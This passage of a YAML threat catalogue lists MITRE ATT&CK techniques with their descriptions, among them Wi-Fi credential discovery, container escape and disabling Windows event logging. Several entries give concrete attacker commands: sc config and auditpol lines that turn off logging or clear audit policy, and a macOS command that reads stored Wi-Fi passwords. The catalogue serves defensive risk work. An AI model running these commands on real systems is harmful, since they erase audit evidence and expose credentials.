      \ BleepingComputer Agent Tesla steal wifi passwords)(Citation: Malware Bytes\
      \ New AgentTesla variant steals WiFi credentials)(Citation: Check Point APT35\
      \ CharmPower January 2022) Additionally, names and other details of locally\
      \ reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` [Native\
      \ API](https://attack.mitre.org/techniques/T1106) functions.(Citation: Binary\
      \ Defense Emotes Wi-Fi Spreader)\n\nOn Linux, names and passwords of all Wi-Fi-networks\
      \ a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`.(Citation:\
      \ Wi-Fi Password of All Connected Networks in Windows/Linux) On macOS, the password\
      \ of a known Wi-Fi may be identified with ` security find-generic-password -wa\
      \ wifiname` (requires admin username/password).(Citation: Find Wi-Fi Password\
      \ on Mac)\nhttps://attack.mitre.org/techniques/T1016/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1480.002
    ref_id: T1480.002
    name: Mutual Exclusion
    description: 'Adversaries may constrain execution or actions based on the presence
      of a mutex associated with malware. A mutex is a locking mechanism used to synchronize
      access to a resource. Only one thread or process can acquire a mutex at a given
      time.(Citation: Microsoft Mutexes)


      While local mutexes only exist within a given process, allowing multiple threads
      to synchronize access to a resource, system mutexes can be used to synchronize
      the activities of multiple processes.(Citation: Microsoft Mutexes) By creating
      a unique system mutex associated with a particular malware, adversaries can
      verify whether or not a system has already been compromised.(Citation: Sans
      Mutexes 2012)


      In Linux environments, malware may instead attempt to acquire a lock on a mutex
      file. If the malware is able to acquire the lock, it continues to execute; if
      it fails, it exits to avoid creating a second instance of itself.(Citation:
      Intezer RedXOR 2021)(Citation: Deep Instinct BPFDoor 2023)


      Mutex names may be hard-coded or dynamically generated using a predictable algorithm.(Citation:
      ICS Mutexes 2015)

      https://attack.mitre.org/techniques/T1480/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.011
    ref_id: T1564.011
    name: Ignore Process Interrupts
    description: "Adversaries may evade defensive mechanisms by executing commands\
      \ that hide from process interrupt signals. Many operating systems use signals\
      \ to deliver messages to control process behavior. Command interpreters often\
      \ include specific commands/flags that ignore errors and other hangups, such\
      \ as when the user of the active session logs off.(Citation: Linux Signal Man)\
      \  These interrupt signals may also be used by defensive tools and/or analysts\
      \ to pause or terminate specified running processes. \n\nAdversaries may invoke\
      \ processes using `nohup`, [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ `-ErrorAction SilentlyContinue`, or similar commands that may be immune to\
      \ hangups.(Citation: nohup Linux Man)(Citation: Microsoft PowerShell SilentlyContinue)\
      \ This may enable malicious commands and malware to continue execution through\
      \ system events that would otherwise terminate its execution, such as users\
      \ logging off or the termination of its C2 network connection.\n\nHiding from\
      \ process interrupt signals may allow malware to continue execution, but unlike\
      \ [Trap](https://attack.mitre.org/techniques/T1546/005) this does not establish\
      \ [Persistence](https://attack.mitre.org/tactics/TA0003) since the process will\
      \ not be re-invoked once actually terminated.\nhttps://attack.mitre.org/techniques/T1564/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1611
    ref_id: T1611
    name: Escape to Host
    description: "Adversaries may break out of a container to gain access to the underlying\
      \ host. This can allow an adversary access to other containerized resources\
      \ from the host level or to the host itself. In principle, containerized resources\
      \ should provide a clear separation of application functionality and be isolated\
      \ from the host environment.(Citation: Docker Overview)\n\nThere are multiple\
      \ ways an adversary may escape to a host environment. Examples include creating\
      \ a container configured to mount the host\u2019s filesystem using the bind\
      \ parameter, which allows the adversary to drop payloads and execute control\
      \ utilities such as cron on the host; utilizing a privileged container to run\
      \ commands or load a malicious kernel module on the underlying host; or abusing\
      \ system calls such as `unshare` and `keyctl` to escalate privileges and steal\
      \ secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation:\
      \ Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes\
      \ Container Escape)(Citation: Keyctl-unmask)\n\nAdditionally, an adversary may\
      \ be able to exploit a compromised container with a mounted container management\
      \ socket, such as `docker.sock`, to break out of the container via a [Container\
      \ Administration Command](https://attack.mitre.org/techniques/T1609).(Citation:\
      \ Container Escape) Adversaries may also escape via [Exploitation for Privilege\
      \ Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting\
      \ vulnerabilities in global symbolic links in order to access the root directory\
      \ of a host machine.(Citation: Windows Server Containers Are Open)\n\nGaining\
      \ access to the host may provide the adversary with the opportunity to achieve\
      \ follow-on objectives, such as establishing persistence, moving laterally within\
      \ the environment, accessing other containers running on the host, or setting\
      \ up a command and control channel on the host.\nhttps://attack.mitre.org/techniques/T1611"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.009
    ref_id: T1547.009
    name: Shortcut Modification
    description: 'Adversaries may create or modify shortcuts that can execute a program
      during system boot or user login. Shortcuts or symbolic links are used to reference
      other files or programs that will be opened or executed when the shortcut is
      clicked or executed by a system startup process.


      Adversaries may abuse shortcuts in the startup folder to execute their tools
      and achieve persistence.(Citation: Shortcut for Persistence ) Although often
      used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)),
      adversaries may also create a new shortcut as a means of indirection, while
      also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make
      the malicious shortcut appear as a legitimate program. Adversaries can also
      edit the target path or entirely replace an existing shortcut so their malware
      will be executed instead of the intended legitimate program.


      Shortcuts can also be abused to establish persistence by implementing other
      methods. For example, LNK browser extensions may be modified (e.g. [Browser
      Extensions](https://attack.mitre.org/techniques/T1176)) to persistently launch
      malware.

      https://attack.mitre.org/techniques/T1547/009'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1010
    ref_id: T1010
    name: Application Window Discovery
    description: 'Adversaries may attempt to get a listing of open application windows.
      Window listings could convey information about how the system is used.(Citation:
      Prevailion DarkWatchman 2021) For example, information about application windows
      could be used identify potential data to collect as well as identifying security
      tooling ([Security Software Discovery](https://attack.mitre.org/techniques/T1518/001))
      to evade.(Citation: ESET Grandoreiro April 2020)


      Adversaries typically abuse system features for this type of enumeration. For
      example, they may gather information through native system features such as
      [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)
      commands and [Native API](https://attack.mitre.org/techniques/T1106) functions.

      https://attack.mitre.org/techniques/T1010'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1087.003
    ref_id: T1087.003
    name: Email Account
    description: 'Adversaries may attempt to get a listing of email addresses and
      accounts. Adversaries may try to dump Exchange address lists such as global
      address lists (GALs).(Citation: Microsoft Exchange Address Lists)


      In on-premises Exchange and Exchange Online, the <code>Get-GlobalAddressList</code>
      PowerShell cmdlet can be used to obtain email addresses and accounts from a
      domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation:
      Black Hills Attacking Exchange MailSniper, 2016)


      In Google Workspace, the GAL is shared with Microsoft Outlook users through
      the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally,
      the Google Workspace Directory allows for users to get a listing of other users
      within the organization.(Citation: Google Workspace Global Access List)

      https://attack.mitre.org/techniques/T1087/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1497.003
    ref_id: T1497.003
    name: Time Based Evasion
    description: 'Adversaries may employ various time-based methods to detect and
      avoid virtualization and analysis environments. This may include enumerating
      time-based properties, such as uptime or the system clock, as well as the use
      of timers or other triggers to avoid a virtual machine environment (VME) or
      sandbox, specifically those that are automated or only operate for a limited
      amount of time.


      Adversaries may employ various time-based evasions, such as delaying malware
      functionality upon initial execution using programmatic sleep commands or native
      system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)).
      Delays may also be based on waiting for specific victim conditions to be met
      (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104)
      to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness)


      Benign commands or other operations may also be used to delay malware execution.
      Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s,
      may be used to delay malware execution and potentially exceed time thresholds
      of automated analysis environments.(Citation: Revil Independence Day)(Citation:
      Netskope Nitol) Another variation, commonly referred to as API hammering, involves
      making various calls to [Native API](https://attack.mitre.org/techniques/T1106)
      functions in order to delay execution (while also potentially overloading analysis
      environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)


      Adversaries may also use time as a metric to detect sandboxes and analysis environments,
      particularly those that attempt to manipulate time mechanisms to simulate longer
      elapses of time. For example, an adversary may be able to identify a sandbox
      accelerating time by sampling and calculating the expected value for an environment''s
      timestamp before and after execution of a sleep function.(Citation: ISACA Malware
      Tricks)

      https://attack.mitre.org/techniques/T1497/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.003
    ref_id: T1218.003
    name: CMSTP
    description: "Adversaries may abuse CMSTP to proxy execution of malicious code.\
      \ The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line\
      \ program used to install Connection Manager service profiles. (Citation: Microsoft\
      \ Connection Manager Oct 2009) CMSTP.exe accepts an installation information\
      \ file (INF) as a parameter and installs a service profile leveraged for remote\
      \ access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected\
      \ with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar\
      \ to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / \u201DSquiblydoo\u201D\
      , CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP\
      \ Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter\
      \ CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation:\
      \ Endurant CMSTP July 2018) This execution may also bypass AppLocker and other\
      \ application control defenses since CMSTP.exe is a legitimate binary that may\
      \ be signed by Microsoft.\n\nCMSTP.exe can also be abused to [Bypass User Account\
      \ Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary\
      \ commands from a malicious INF through an auto-elevated COM interface. (Citation:\
      \ MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List)\
      \ (Citation: Endurant CMSTP July 2018)\nhttps://attack.mitre.org/techniques/T1218/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1563.001
    ref_id: T1563.001
    name: SSH Hijacking
    description: 'Adversaries may hijack a legitimate user''s SSH session to move
      laterally within an environment. Secure Shell (SSH) is a standard means of remote
      access on Linux and macOS systems. It allows a user to connect to another system
      via an encrypted tunnel, commonly authenticating through a password, certificate
      or the use of an asymmetric encryption key pair.


      In order to move laterally from a compromised host, adversaries may take advantage
      of trust relationships established with other systems via public key authentication
      in active SSH sessions by hijacking an existing connection to another system.
      This may occur through compromising the SSH agent itself or by having access
      to the agent''s socket. If an adversary is able to obtain root access, then
      hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation:
      SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach
      Post-mortem SSH Hijack)


      [SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from
      use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks
      an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

      https://attack.mitre.org/techniques/T1563/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1562.002
    ref_id: T1562.002
    name: Disable Windows Event Logging
    description: "Adversaries may disable Windows event logging to limit data that\
      \ can be leveraged for detections and audits. Windows event logs record user\
      \ and system activity such as login attempts, process creation, and much more.(Citation:\
      \ Windows Log Events) This data is used by security tools and analysts to generate\
      \ detections.\n\nThe EventLog service maintains event logs from various system\
      \ components and applications.(Citation: EventLog_Core_Technologies) By default,\
      \ the service automatically starts when a system powers on. An audit policy,\
      \ maintained by the Local Security Policy (secpol.msc), defines which system\
      \ events the EventLog service logs. Security audit policy settings can be changed\
      \ by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\\
      Audit Policy</code> for basic audit policy settings or <code>Security Settings\\\
      Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation:\
      \ Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code>\
      \ may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries\
      \ may target system-wide logging or just that of a particular application. For\
      \ example, the Windows EventLog service may be disabled using the <code>Set-Service\
      \ -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code>\
      \ commands (followed by manually stopping the service using <code>Stop-Service\
      \  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging)\
      \ Additionally, the service may be disabled by modifying the \u201CStart\u201D\
      \ value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code>\
      \ then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\
      \nThere are several ways to disable the EventLog service via registry key modification.\
      \ First, without Administrator privileges, adversaries may modify the \"Start\"\
      \ value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\\
      WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable\
      \ the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second,\
      \ with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\\
      SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code>\
      \ and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\\
      EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\
      \nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands\
      \ in a command prompt to disable auditing or clear the audit policy. To enable\
      \ or disable a specified setting or audit category, adversaries may use the\
      \ <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol\
      \ /set /category:\u201DAccount Logon\u201D /success:disable /failure:disable</code>\
      \ turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation:\
      \ T1562.002_redcanaryco) To clear the audit policy, adversaries may run the\
      \ following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove\
      \ /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows\
      \ event logging, adversaries can operate while leaving less evidence of a compromise\
      \ behind.\nhttps://attack.mitre.org/techniques/T1562/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1029
    ref_id: T1029
    name: Scheduled Transfer
    description: 'Adversaries may schedule data exfiltration to be performed only
      at certain times of day or at certain intervals. This could be done to blend
      traffic patterns with normal activity or availability.


      When scheduled exfiltration is used, other exfiltration techniques likely apply
      as well to transfer the information out of the network, such as [Exfiltration
      Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration
      Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).

      https://attack.mitre.org/techniques/T1029'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.002
    ref_id: T1021.002
    name: SMB/Windows Admin Shares
    description: 'Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      to interact with a remote network share using Server Message Block (SMB). The
      adversary may then perform actions as the logged-on user.


      SMB is a file, printer, and serial port sharing protocol for Windows machines
      on the same network or domain. Adversaries may use SMB to interact with file
      shares, allowing them to move laterally throughout a network. Linux and macOS
      implementations of SMB typically use Samba.


      Windows systems have hidden network shares that are accessible only to administrators
      and provide the ability for remote file copy and other administrative functions.
      Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use
      this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      to remotely access a networked system over SMB,(Citation: Wikipedia Server Message
      Block) to interact with systems using remote procedure calls (RPCs),(Citation:
      TechNet RPC) transfer files, and run transferred binaries through remote Execution.
      Example execution techniques that rely on authenticated sessions over SMB/RPC
      are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service
      Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management
      Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can
      also use NTLM hashes to access administrator shares on systems with [Pass the
      Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration
      and patch levels.(Citation: Microsoft Admin Shares)

      https://attack.mitre.org/techniques/T1021/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1525
    ref_id: T1525
    name: Implant Internal Image
    description: "Adversaries may implant cloud or container images with malicious\
      \ code to establish persistence after gaining access to an environment. Amazon\
      \ Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP)\
      \ Images, and Azure Images as well as popular container runtimes such as Docker\
      \ can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001),\
      \ this technique focuses on adversaries implanting an image in a registry within\
      \ a victim\u2019s environment. Depending on how the infrastructure is provisioned,\
      \ this could provide persistent access if the infrastructure provisioning tool\
      \ is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image\
      \ Backdoor Technique Sept 2019)\n\nA tool has been developed to facilitate planting\
      \ backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September\
      \ 2019) If an adversary has access to a compromised AWS instance, and permissions\
      \ to list the available container images, they may implant a backdoor such as\
      \ a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino\
      \ Labs Cloud Image Backdoor Technique Sept 2019)\nhttps://attack.mitre.org/techniques/T1525"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1572
    ref_id: T1572
    name: Protocol Tunneling
    description: "Adversaries may tunnel network communications to and from a victim\
      \ system within a separate protocol to avoid detection/network filtering and/or\
      \ enable access to otherwise unreachable systems. Tunneling involves explicitly\
      \ encapsulating a protocol within another. This behavior may conceal malicious\
      \ traffic by blending in with existing traffic and/or provide an outer layer\
      \ of encryption (similar to a VPN). Tunneling could also enable routing of network\
      \ packets that would otherwise not reach their intended destination, such as\
      \ SMB, RDP, or other traffic that would be filtered by network appliances or\
      \ not routed over the Internet. \n\nThere are various means to encapsulate a\
      \ protocol within another protocol. For example, adversaries may perform SSH\
      \ tunneling (also known as SSH port forwarding), which involves forwarding arbitrary\
      \ data over an encrypted SSH tunnel.(Citation: SSH Tunneling) \n\n[Protocol\
      \ Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by\
      \ adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568).\
      \ Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be\
      \ encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua\
      \ JUL19) \n\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572)\
      \ in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or\
      \ [Protocol or Service Impersonation](https://attack.mitre.org/techniques/T1001/003)\
      \ to further conceal C2 communications and infrastructure.\nhttps://attack.mitre.org/techniques/T1572"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.002
    ref_id: T1218.002
    name: Control Panel
    description: 'Adversaries may abuse control.exe to proxy execution of malicious
      payloads. The Windows Control Panel process binary (control.exe) handles execution
      of Control Panel items, which are utilities that allow users to view and adjust
      computer settings.


      Control Panel items are registered executable (.exe) or Control Panel (.cpl)
      files, the latter are actually renamed dynamic-link library (.dll) files that
      export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation:
      TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically
      include graphical menus available to users after being registered and loaded
      into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel
      items can be executed directly from the command line, programmatically via an
      application programming interface (API) call, or by simply double-clicking the
      file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware
      Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)


      Malicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566)
      campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL
      Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo
      Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also
      bypass application and/or file extension allow lists.


      Adversaries may also rename malicious DLL files (.dll) with Control Panel file
      extensions (.cpl) and register them to <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Control
      Panel\Cpls</code>. Even when these registered DLLs do not comply with the CPL
      file specification and do not export <code>CPlApplet</code> functions, they
      are loaded and executed through its <code>DllEntryPoint</code> when Control
      Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly
      executable.(Citation: ESET InvisiMole June 2020)

      https://attack.mitre.org/techniques/T1218/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1599.001
    ref_id: T1599.001
    name: Network Address Translation Traversal
    description: "Adversaries may bridge network boundaries by modifying a network\
      \ device\u2019s Network Address Translation (NAT) configuration. Malicious modifications\
      \ to NAT may enable an adversary to bypass restrictions on traffic routing that\
      \ otherwise separate trusted and untrusted networks.\n\nNetwork devices such\
      \ as routers and firewalls that connect multiple networks together may implement\
      \ NAT during the process of passing packets between networks. When performing\
      \ NAT, the network device will rewrite the source and/or destination addresses\
      \ of the IP address header. Some network designs require NAT for the packets\
      \ to cross the border device.  A typical example of this is environments where\
      \ internal networks make use of non-Internet routable addresses.(Citation: RFC1918)\n\
      \nWhen an adversary gains control of a network boundary device, they can either\
      \ leverage existing NAT configurations to send traffic between two separated\
      \ networks, or they can implement NAT configurations of their own design.  In\
      \ the case of network designs that require NAT to function, this enables the\
      \ adversary to overcome inherent routing limitations that would normally prevent\
      \ them from accessing protected systems behind the border device.  In the case\
      \ of network designs that do not require NAT, address translation can be used\
      \ by adversaries to obscure their activities, as changing the addresses of packets\
      \ that traverse a network boundary device can make monitoring data transmissions\
      \ more challenging for defenders.  \n\nAdversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001)\
      \ to change the operating system of a network device, implementing their own\
      \ custom NAT mechanisms to further obscure their activities\nhttps://attack.mitre.org/techniques/T1599/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1608.002
    ref_id: T1608.002
    name: Upload Tool
    description: 'Adversaries may upload tools to third-party or adversary controlled
      infrastructure to make it accessible during targeting. Tools can be open or
      closed source, free or commercial. Tools can be used for malicious purposes
      by an adversary, but (unlike malware) were not intended to be used for those
      purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Adversaries
      may upload tools to support their operations, such as making a tool available
      to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)
      by placing it on an Internet accessible web server.


      Tools may be placed on infrastructure that was previously purchased/rented by
      the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583))
      or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).(Citation:
      Dell TG-3390) Tools can also be staged on web services, such as an adversary
      controlled GitHub repo, or on Platform-as-a-Service offerings that enable users
      to easily provision applications.(Citation: Dragos Heroku Watering Hole)(Citation:
      Malwarebytes Heroku Skimmers)(Citation: Intezer App Service Phishing)


      Adversaries can avoid the need to upload a tool by having compromised victim
      machines download the tool directly from a third-party hosting location (ex:
      a non-adversary controlled GitHub repo), including the original hosting site
      of the tool.

      https://attack.mitre.org/techniques/T1608/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.005
    ref_id: T1547.005
    name: Security Support Provider
    description: 'Adversaries may abuse security support providers (SSPs) to execute
      DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security
      Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs
      have access to encrypted and plaintext passwords that are stored in Windows,
      such as any logged-on user''s Domain password or smart card PINs.


      The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security
      Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security
      Packages</code>. An adversary may modify these Registry keys to add new SSPs,
      which will be loaded the next time the system boots, or when the AddSecurityPackage
      Windows API function is called.(Citation: Graeber 2014)

      https://attack.mitre.org/techniques/T1547/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1550
    ref_id: T1550
    name: Use Alternate Authentication Material
    description: "Adversaries may use alternate authentication material, such as password\
      \ hashes, Kerberos tickets, and application access tokens, in order to move\
      \ laterally within an environment and bypass normal system access controls.\
      \ \n\nAuthentication processes generally require a valid identity (e.g., username)\
      \ along with one or more authentication factors (e.g., password, pin, physical\
      \ smart card, token generator, etc.). Alternate authentication material is legitimately\
      \ generated by systems after a user or application successfully authenticates\
      \ by providing a valid identity and the required authentication factor(s). Alternate\
      \ authentication material may also be generated during the identity creation\
      \ process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate\
      \ authentication material allows the system to verify an identity has successfully\
      \ authenticated without asking the user to reenter authentication factor(s).\
      \ Because the alternate authentication must be maintained by the system\u2014\
      either in memory or on disk\u2014it may be at risk of being stolen through [Credential\
      \ Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate\
      \ authentication material, adversaries are able to bypass system access controls\
      \ and authenticate to systems without knowing the plaintext password or any\
      \ additional authentication factors.\nhttps://attack.mitre.org/techniques/T1550"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1597.001
    ref_id: T1597.001
    name: Threat Intel Vendors
    description: 'Adversaries may search private data from threat intelligence vendors
      for information that can be used during targeting. Threat intelligence vendors
      may offer paid feeds or portals that offer more data than what is publicly reported.
      Although sensitive details (such as customer names and other identifiers) may
      be redacted, this information may contain trends regarding breaches such as
      target industries, attribution claims, and successful TTPs/countermeasures.(Citation:
      D3Secutrity CTI Feeds)


      Adversaries may search in private threat intelligence vendor data to gather
      actionable information. Threat actors may seek information/indicators gathered
      about their own campaigns, as well as those conducted by other adversaries that
      may align with their target industries, capabilities/objectives, or other operational
      concerns. Information reported by vendors may also reveal opportunities other
      forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)
      or [External Remote Services](https://attack.mitre.org/techniques/T1133)).

      https://attack.mitre.org/techniques/T1597/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1011
    ref_id: T1011
    name: Exfiltration Over Other Network Medium
    description: 'Adversaries may attempt to exfiltrate data over a different network
      medium than the command and control channel. If the command and control network
      is a wired Internet connection, the exfiltration may occur, for example, over
      a WiFi connection, modem, cellular data connection, Bluetooth, or another radio
      frequency (RF) channel.


      Adversaries may choose to do this if they have sufficient access or proximity,
      and the connection might not be secured or defended as well as the primary Internet-connected
      channel because it is not routed through the same enterprise network.

      https://attack.mitre.org/techniques/T1011'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1602.002
    ref_id: T1602.002
    name: Network Device Configuration Dump
    description: 'Adversaries may access network configuration files to collect sensitive
      data about the device and the network. The network configuration is a file containing
      parameters that determine the operation of the device. The device typically
      stores an in-memory copy of the configuration while operating, and a separate
      configuration on non-volatile storage to load after device reset. Adversaries
      can inspect the configuration files to reveal information about the target network
      and its layout, the network device and its software, or identifying legitimate
      accounts and credentials for later use.


      Adversaries can use common management tools and protocols, such as Simple Network
      Management Protocol (SNMP) and Smart Install (SMI), to access network configuration
      files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation:
      Cisco Blog Legacy Device Attacks) These tools may be used to query specific
      data from a configuration repository or configure the device to export the configuration
      for later analysis.

      https://attack.mitre.org/techniques/T1602/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1589
    ref_id: T1589
    name: Gather Victim Identity Information
    description: 'Adversaries may gather information about the victim''s identity
      that can be used during targeting. Information about identities may include
      a variety of details, including personal data (ex: employee names, email addresses,
      security question responses, etc.) as well as sensitive details such as credentials
      or multi-factor authentication (MFA) configurations.


      Adversaries may gather this information in various ways, such as direct elicitation
      via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595))
      such as probing and analyzing responses from authentication services that may
      reveal valid usernames in a system or permitted MFA /methods associated with
      those usernames.(Citation: GrimBlog UsernameEnum)(Citation: Obsidian SSPR Abuse
      2023) Information about victims may also be exposed to adversaries via online
      or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)
      or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:
      OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify
      Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation:
      GitHub Gitrob)(Citation: CNET Leaks)


      Gathering this information may reveal opportunities for other forms of reconnaissance
      (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing
      operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)),
      and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)
      or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).

      https://attack.mitre.org/techniques/T1589'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1562.004
    ref_id: T1562.004
    name: Disable or Modify System Firewall
    description: 'Adversaries may disable or modify system firewalls in order to bypass
      controls limiting network usage. Changes could be disabling the entire mechanism
      as well as adding, deleting, or modifying particular rules. This can be done
      numerous ways depending on the operating system, including via command-line,
      editing Windows Registry keys, and Windows Control Panel.


      Modifying or disabling a system firewall may enable adversary C2 communications,
      lateral movement, and/or data exfiltration that would otherwise not be allowed.
      For example, adversaries may add a new firewall rule for a well-known protocol
      (such as RDP) using a non-traditional and potentially less securitized port
      (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation:
      change_rdp_port_conti)


